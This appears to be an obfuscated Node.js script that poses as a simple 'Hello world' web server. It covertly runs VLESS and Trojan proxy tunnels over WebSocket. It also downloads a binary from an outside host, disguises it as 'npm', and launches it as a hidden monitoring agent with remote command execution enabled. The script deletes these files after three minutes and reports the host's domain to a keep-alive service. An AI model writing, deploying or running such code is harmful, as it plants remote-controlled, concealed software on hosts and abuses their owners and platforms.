function _0x570d(_0x5739ad,_0xcba7cd){_0x5739ad=_0x5739ad-0x130;const _0x55af15=_0x55af();let _0x570d6c=_0x55af15[_0x5739ad];return _0x570d6c;}const _0x1f5f12=_0x570d;(function(_0x542274,_0x5473ad){const _0x5ad1fc=_0x570d,_0x1b986b=_0x542274();while(!![]){try{const _0x3202f4=-parseInt(_0x5ad1fc(0x157))/0x1+-parseInt(_0x5ad1fc(0x16d))/0x2*(parseInt(_0x5ad1fc(0x18c))/0x3)+parseInt(_0x5ad1fc(0x176))/0x4*(parseInt(_0x5ad1fc(0x137))/0x5)+parseInt(_0x5ad1fc(0x192))/0x6*(parseInt(_0x5ad1fc(0x170))/0x7)+parseInt(_0x5ad1fc(0x19b))/0x8*(-parseInt(_0x5ad1fc(0x172))/0x9)+parseInt(_0x5ad1fc(0x138))/0xa*(parseInt(_0x5ad1fc(0x19d))/0xb)+parseInt(_0x5ad1fc(0x13d))/0xc;if(_0x3202f4===_0x5473ad)break;else _0x1b986b['push'](_0x1b986b['shift']());}catch(_0x48a99e){_0x1b986b['push'](_0x1b986b['shift']());}}}(_0x55af,0xebd67));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x1f5f12(0x18a)),net=require(_0x1f5f12(0x17e)),path=require('path'),crypto=require(_0x1f5f12(0x155)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x1f5f12(0x196)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x1f5f12(0x130)]['UUID']||_0x1f5f12(0x1a1),NEZHA_SERVER=process[_0x1f5f12(0x130)][_0x1f5f12(0x179)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x1f5f12(0x130)][_0x1f5f12(0x14c)]||'',DOMAIN=process[_0x1f5f12(0x130)][_0x1f5f12(0x183)]||_0x1f5f12(0x136),AUTO_ACCESS=process[_0x1f5f12(0x130)][_0x1f5f12(0x191)]||!![],WSPATH=process[_0x1f5f12(0x130)][_0x1f5f12(0x18f)]||UUID[_0x1f5f12(0x14a)](0x0,0x8),SUB_PATH=process['env'][_0x1f5f12(0x151)]||'sub',NAME=process[_0x1f5f12(0x130)]['NAME']||'',PORT=process[_0x1f5f12(0x130)][_0x1f5f12(0x181)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x583a6f=_0x1f5f12;try{const _0x193e29=await axios[_0x583a6f(0x161)](_0x583a6f(0x149)),_0x3a5d71=_0x193e29[_0x583a6f(0x18d)];ISP=(_0x3a5d71['country_code']+'-'+_0x3a5d71[_0x583a6f(0x1a4)])[_0x583a6f(0x195)](/ /g,'_');}catch(_0x4ee944){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((_0x46ffca,_0x3adbca)=>{const _0x56d4f6=_0x1f5f12;if(_0x46ffca[_0x56d4f6(0x17b)]==='/'){const _0x4b0de1=path[_0x56d4f6(0x16b)](__dirname,_0x56d4f6(0x19f));fs['readFile'](_0x4b0de1,_0x56d4f6(0x144),(_0x50def1,_0x22a01b)=>{const _0xdb8d29=_0x56d4f6;if(_0x50def1){_0x3adbca[_0xdb8d29(0x133)](0xc8,{'Content-Type':'text/html'}),_0x3adbca[_0xdb8d29(0x174)](_0xdb8d29(0x14d));return;}_0x3adbca[_0xdb8d29(0x133)](0xc8,{'Content-Type':_0xdb8d29(0x16f)}),_0x3adbca['end'](_0x22a01b);});return;}else{if(_0x46ffca[_0x56d4f6(0x17b)]==='/'+SUB_PATH){const _0x4e7a6c=NAME?NAME+'-'+ISP:ISP,_0x582b01=_0x56d4f6(0x177)+UUID+'@'+DOMAIN+_0x56d4f6(0x193)+DOMAIN+_0x56d4f6(0x1a3)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x4e7a6c,_0xf568a1=_0x56d4f6(0x13b)+UUID+'@'+DOMAIN+_0x56d4f6(0x1a5)+DOMAIN+_0x56d4f6(0x1a3)+DOMAIN+_0x56d4f6(0x173)+WSPATH+'#'+_0x4e7a6c,_0x7b7e3b=_0x582b01+'\x0a'+_0xf568a1,_0xd01921=Buffer[_0x56d4f6(0x199)](_0x7b7e3b)[_0x56d4f6(0x175)]('base64');_0x3adbca[_0x56d4f6(0x133)](0xc8,{'Content-Type':_0x56d4f6(0x14f)}),_0x3adbca['end'](_0xd01921+'\x0a');}else _0x3adbca['writeHead'](0x194,{'Content-Type':_0x56d4f6(0x14f)}),_0x3adbca['end'](_0x56d4f6(0x14b));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x1f5f12(0x195)](/-/g,''),DNS_SERVERS=[_0x1f5f12(0x185),_0x1f5f12(0x17a)];function resolveHost(_0x64739e){return new Promise((_0x5e0fdb,_0x1c86cc)=>{const _0x44687a=_0x570d;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x44687a(0x141)](_0x64739e)){_0x5e0fdb(_0x64739e);return;}let _0x427241=0x0;function _0x5b17f9(){const _0x4c921c=_0x44687a;if(_0x427241>=DNS_SERVERS[_0x4c921c(0x159)]){_0x1c86cc(new Error(_0x4c921c(0x13c)+_0x64739e+_0x4c921c(0x171)));return;}const _0x4b5c12=DNS_SERVERS[_0x427241];_0x427241++;const _0x245d4a=_0x4c921c(0x148)+encodeURIComponent(_0x64739e)+_0x4c921c(0x16c);axios[_0x4c921c(0x161)](_0x245d4a,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x4c921c(0x163)](_0x3d7501=>{const _0x2bbb14=_0x4c921c,_0x25edc3=_0x3d7501[_0x2bbb14(0x18d)];if(_0x25edc3['Status']===0x0&&_0x25edc3['Answer']&&_0x25edc3[_0x2bbb14(0x166)][_0x2bbb14(0x159)]>0x0){const _0x1a7798=_0x25edc3[_0x2bbb14(0x166)][_0x2bbb14(0x178)](_0x48a5da=>_0x48a5da[_0x2bbb14(0x182)]===0x1);if(_0x1a7798){_0x5e0fdb(_0x1a7798[_0x2bbb14(0x18d)]);return;}}_0x5b17f9();})[_0x4c921c(0x165)](_0x3ce7cb=>{_0x5b17f9();});}_0x5b17f9();});}function _0x55af(){const _0x4b1e72=['108270cxLdJg','data','arm64','WSPATH','connection','AUTO_ACCESS','6414DXQexz',':443?encryption=none&security=tls&sni=','pop','replace','child_process','concat','arch','from','substr','8iWUNmT','aarch64','77Sxsazk','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','index.html','Automatic\x20Access\x20Task\x20added\x20successfully','32e765b9-1dbd-4280-8766-a5f09eb03584','2053','&fp=chrome&type=ws&host=','isp',':443?security=tls&sni=','every','createHash','env','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','config.yaml','writeHead','includes','arm','1234.abc.com','1093460RiPcJt','2512670bMkPql','log','connect','trojan://','Failed\x20to\x20resolve\x20','11929968WEXviX','2083','chmod\x20+x\x20npm','map','test','npm\x20is\x20already\x20running,\x20skip\x20running...','message','utf8','error','https://oooo.serv00.net/add-url','https://arm64.ssss.nyc.mn/agent','https://dns.google/resolve?name=','https://api.ip.sb/geoip','slice','Not\x20Found\x0a','NEZHA_KEY','Hello\x20world!','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','text/plain','post','SUB_PATH','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','sha224','writeFileSync','crypto','https://arm64.ssss.nyc.mn/v1','671941LiRrME','https://','length','client_secret:\x20','443','trim','unlink','write','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','createWriteStream','get','reduce','then','true','catch','Answer','readUInt8','pipe','split','npm\x20download\x20successfully','join','&type=A','86OwDEXK','8443','text/html','5222HzoBPc','\x20with\x20all\x20DNS\x20servers','7182801cYGWKA','&path=%2F','end','toString','8EbXmQG','vless://','find','NEZHA_SERVER','1.1.1.1','url','https://amd64.ssss.nyc.mn/agent','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','net','error:\x20','\x20-p\x20','PORT','type','DOMAIN','readUInt16BE','8.8.4.4','stream','utf-8','setsid\x20nohup\x20./npm\x20-s\x20','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','axios','https://amd64.ssss.nyc.mn/v1'];_0x55af=function(){return _0x4b1e72;};return _0x55af();}function handleVlessConnection(_0x149216,_0x54a0ac){const _0x330f56=_0x1f5f12,[_0x2141dd]=_0x54a0ac,_0x4d107e=_0x54a0ac[_0x330f56(0x14a)](0x1,0x11);if(!_0x4d107e[_0x330f56(0x1a6)]((_0x45d00e,_0x26ee79)=>_0x45d00e==parseInt(uuid[_0x330f56(0x19a)](_0x26ee79*0x2,0x2),0x10)))return![];let _0x386803=_0x54a0ac[_0x330f56(0x14a)](0x11,0x12)[_0x330f56(0x167)]()+0x13;const _0x15145c=_0x54a0ac[_0x330f56(0x14a)](_0x386803,_0x386803+=0x2)[_0x330f56(0x184)](0x0),_0x2e4a0c=_0x54a0ac[_0x330f56(0x14a)](_0x386803,_0x386803+=0x1)[_0x330f56(0x167)](),_0x4c1344=_0x2e4a0c==0x1?_0x54a0ac[_0x330f56(0x14a)](_0x386803,_0x386803+=0x4)[_0x330f56(0x16b)]('.'):_0x2e4a0c==0x2?new TextDecoder()['decode'](_0x54a0ac[_0x330f56(0x14a)](_0x386803+0x1,_0x386803+=0x1+_0x54a0ac[_0x330f56(0x14a)](_0x386803,_0x386803+0x1)[_0x330f56(0x167)]())):_0x2e4a0c==0x3?_0x54a0ac['slice'](_0x386803,_0x386803+=0x10)[_0x330f56(0x162)]((_0x54c85d,_0x9596d1,_0xe0d5f7,_0x2b7476)=>_0xe0d5f7%0x2?_0x54c85d[_0x330f56(0x197)](_0x2b7476[_0x330f56(0x14a)](_0xe0d5f7-0x1,_0xe0d5f7+0x1)):_0x54c85d,[])['map'](_0x12119a=>_0x12119a['readUInt16BE'](0x0)[_0x330f56(0x175)](0x10))['join'](':'):'';_0x149216['send'](new Uint8Array([_0x2141dd,0x0]));const _0x4a805d=createWebSocketStream(_0x149216);return resolveHost(_0x4c1344)[_0x330f56(0x163)](_0x334706=>{const _0x245a8d=_0x330f56;net[_0x245a8d(0x13a)]({'host':_0x334706,'port':_0x15145c},function(){const _0x382074=_0x245a8d;this[_0x382074(0x15e)](_0x54a0ac[_0x382074(0x14a)](_0x386803)),_0x4a805d['on'](_0x382074(0x145),()=>{})[_0x382074(0x168)](this)['on'](_0x382074(0x145),()=>{})[_0x382074(0x168)](_0x4a805d);})['on'](_0x245a8d(0x145),()=>{});})[_0x330f56(0x165)](_0x32cbc6=>{const _0x36e76f=_0x330f56;net[_0x36e76f(0x13a)]({'host':_0x4c1344,'port':_0x15145c},function(){const _0x323ad8=_0x36e76f;this[_0x323ad8(0x15e)](_0x54a0ac[_0x323ad8(0x14a)](_0x386803)),_0x4a805d['on'](_0x323ad8(0x145),()=>{})[_0x323ad8(0x168)](this)['on'](_0x323ad8(0x145),()=>{})[_0x323ad8(0x168)](_0x4a805d);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x49a157,_0x3d01a5){const _0x30f5ca=_0x1f5f12;try{if(_0x3d01a5[_0x30f5ca(0x159)]<0x3a)return![];const _0x2dadd1=_0x3d01a5[_0x30f5ca(0x14a)](0x0,0x38)['toString'](),_0x57bab3=[UUID];let _0x2f31ee=null;for(const _0x543364 of _0x57bab3){const _0x5bca21=crypto[_0x30f5ca(0x1a7)](_0x30f5ca(0x153))['update'](_0x543364)['digest']('hex');if(_0x5bca21===_0x2dadd1){_0x2f31ee=_0x543364;break;}}if(!_0x2f31ee)return![];let _0x1727ea=0x38;_0x3d01a5[_0x1727ea]===0xd&&_0x3d01a5[_0x1727ea+0x1]===0xa&&(_0x1727ea+=0x2);const _0xa28e80=_0x3d01a5[_0x1727ea];if(_0xa28e80!==0x1)return![];_0x1727ea+=0x1;const _0x310f7e=_0x3d01a5[_0x1727ea];_0x1727ea+=0x1;let _0x564a02,_0x401731;if(_0x310f7e===0x1)_0x564a02=_0x3d01a5[_0x30f5ca(0x14a)](_0x1727ea,_0x1727ea+0x4)[_0x30f5ca(0x16b)]('.'),_0x1727ea+=0x4;else{if(_0x310f7e===0x3){const _0x10009b=_0x3d01a5[_0x1727ea];_0x1727ea+=0x1,_0x564a02=_0x3d01a5[_0x30f5ca(0x14a)](_0x1727ea,_0x1727ea+_0x10009b)['toString'](),_0x1727ea+=_0x10009b;}else{if(_0x310f7e===0x4)_0x564a02=_0x3d01a5[_0x30f5ca(0x14a)](_0x1727ea,_0x1727ea+0x10)[_0x30f5ca(0x162)]((_0x27bc25,_0x46dba2,_0x306ffe,_0x2f2225)=>_0x306ffe%0x2?_0x27bc25[_0x30f5ca(0x197)](_0x2f2225[_0x30f5ca(0x14a)](_0x306ffe-0x1,_0x306ffe+0x1)):_0x27bc25,[])[_0x30f5ca(0x140)](_0x3abf75=>_0x3abf75[_0x30f5ca(0x184)](0x0)['toString'](0x10))[_0x30f5ca(0x16b)](':'),_0x1727ea+=0x10;else return![];}}_0x401731=_0x3d01a5['readUInt16BE'](_0x1727ea),_0x1727ea+=0x2;_0x1727ea<_0x3d01a5[_0x30f5ca(0x159)]&&_0x3d01a5[_0x1727ea]===0xd&&_0x3d01a5[_0x1727ea+0x1]===0xa&&(_0x1727ea+=0x2);const _0x20c8c1=createWebSocketStream(_0x49a157);return resolveHost(_0x564a02)[_0x30f5ca(0x163)](_0x2c7001=>{const _0x7fb021=_0x30f5ca;net[_0x7fb021(0x13a)]({'host':_0x2c7001,'port':_0x401731},function(){const _0x5cfc42=_0x7fb021;_0x1727ea<_0x3d01a5[_0x5cfc42(0x159)]&&this[_0x5cfc42(0x15e)](_0x3d01a5[_0x5cfc42(0x14a)](_0x1727ea)),_0x20c8c1['on']('error',()=>{})[_0x5cfc42(0x168)](this)['on'](_0x5cfc42(0x145),()=>{})['pipe'](_0x20c8c1);})['on'](_0x7fb021(0x145),()=>{});})['catch'](_0x2fad57=>{const _0x1f03be=_0x30f5ca;net[_0x1f03be(0x13a)]({'host':_0x564a02,'port':_0x401731},function(){const _0x130fc9=_0x1f03be;_0x1727ea<_0x3d01a5[_0x130fc9(0x159)]&&this['write'](_0x3d01a5['slice'](_0x1727ea)),_0x20c8c1['on'](_0x130fc9(0x145),()=>{})['pipe'](this)['on'](_0x130fc9(0x145),()=>{})[_0x130fc9(0x168)](_0x20c8c1);})['on'](_0x1f03be(0x145),()=>{});}),!![];}catch(_0x1b5aed){return![];}}wss['on'](_0x1f5f12(0x190),(_0x27261d,_0x544049)=>{const _0x3b4519=_0x1f5f12,_0x278b0d=_0x544049['url']||'';_0x27261d['once'](_0x3b4519(0x143),_0x337c7f=>{const _0x5bd512=_0x3b4519;if(_0x337c7f[_0x5bd512(0x159)]>0x11&&_0x337c7f[0x0]===0x0){const _0x5a2179=_0x337c7f[_0x5bd512(0x14a)](0x1,0x11),_0x1a96da=_0x5a2179[_0x5bd512(0x1a6)]((_0x1e2eb9,_0x116113)=>_0x1e2eb9==parseInt(uuid[_0x5bd512(0x19a)](_0x116113*0x2,0x2),0x10));if(_0x1a96da){!handleVlessConnection(_0x27261d,_0x337c7f)&&_0x27261d['close']();return;}}!handleTrojanConnection(_0x27261d,_0x337c7f)&&_0x27261d['close']();})['on'](_0x3b4519(0x145),()=>{});});const getDownloadUrl=()=>{const _0x276ccd=_0x1f5f12,_0x3f9e8d=os[_0x276ccd(0x198)]();return _0x3f9e8d===_0x276ccd(0x135)||_0x3f9e8d===_0x276ccd(0x18e)||_0x3f9e8d===_0x276ccd(0x19c)?!NEZHA_PORT?_0x276ccd(0x156):_0x276ccd(0x147):!NEZHA_PORT?_0x276ccd(0x18b):_0x276ccd(0x17c);},downloadFile=async()=>{const _0x47210a=_0x1f5f12;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x428efa=getDownloadUrl(),_0x3cfd44=await axios({'method':'get','url':_0x428efa,'responseType':_0x47210a(0x186)}),_0x5ab703=fs[_0x47210a(0x160)]('npm');return _0x3cfd44[_0x47210a(0x18d)][_0x47210a(0x168)](_0x5ab703),new Promise((_0x51f173,_0x14d37a)=>{const _0x4f2705=_0x47210a;_0x5ab703['on']('finish',()=>{const _0x262e81=_0x570d;console[_0x262e81(0x139)](_0x262e81(0x16a)),exec(_0x262e81(0x13f),_0x1dfe96=>{if(_0x1dfe96)_0x14d37a(_0x1dfe96);_0x51f173();});}),_0x5ab703['on'](_0x4f2705(0x145),_0x14d37a);});}catch(_0x55ee80){throw _0x55ee80;}},runnz=async()=>{const _0x25552d=_0x1f5f12;try{const _0x2b717d=execSync(_0x25552d(0x19e),{'encoding':_0x25552d(0x187)});if(_0x2b717d[_0x25552d(0x15c)]()!==''){console[_0x25552d(0x139)](_0x25552d(0x142));return;}}catch(_0x567f27){}await downloadFile();let _0x47d1aa='',_0x15dbd9=[_0x25552d(0x15b),_0x25552d(0x16e),'2096','2087',_0x25552d(0x13e),_0x25552d(0x1a2)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x167d0d=_0x15dbd9[_0x25552d(0x134)](NEZHA_PORT)?'--tls':'';_0x47d1aa=_0x25552d(0x188)+NEZHA_SERVER+':'+NEZHA_PORT+_0x25552d(0x180)+NEZHA_KEY+'\x20'+_0x167d0d+_0x25552d(0x14e);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5c1265=NEZHA_SERVER[_0x25552d(0x134)](':')?NEZHA_SERVER[_0x25552d(0x169)](':')[_0x25552d(0x194)]():'',_0x33b09c=_0x15dbd9[_0x25552d(0x134)](_0x5c1265)?_0x25552d(0x164):'false',_0x4d72e1=_0x25552d(0x15a)+NEZHA_KEY+_0x25552d(0x17d)+NEZHA_SERVER+_0x25552d(0x131)+_0x33b09c+_0x25552d(0x15f)+UUID;fs[_0x25552d(0x154)](_0x25552d(0x132),_0x4d72e1);}_0x47d1aa=_0x25552d(0x152);}else{console[_0x25552d(0x139)](_0x25552d(0x189));return;}}try{exec(_0x47d1aa,{'shell':'/bin/bash'},_0x22114c=>{const _0x53deb3=_0x25552d;if(_0x22114c)console['error']('npm\x20running\x20error:',_0x22114c);else console[_0x53deb3(0x139)]('npm\x20is\x20running');});}catch(_0x4fe5fb){console[_0x25552d(0x145)](_0x25552d(0x17f)+_0x4fe5fb);}};async function addAccessTask(){const _0x1496a4=_0x1f5f12;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2b0a0c=_0x1496a4(0x158)+DOMAIN;try{const _0x2845b1=await axios[_0x1496a4(0x150)](_0x1496a4(0x146),{'url':_0x2b0a0c},{'headers':{'Content-Type':'application/json'}});console['log'](_0x1496a4(0x1a0));}catch(_0x4ffb29){}}const delFiles=()=>{const _0x25757b=_0x1f5f12;fs[_0x25757b(0x15d)]('npm',()=>{}),fs[_0x25757b(0x15d)](_0x25757b(0x132),()=>{});};httpServer['listen'](PORT,()=>{const _0x5d89c3=_0x1f5f12;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x5d89c3(0x139)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
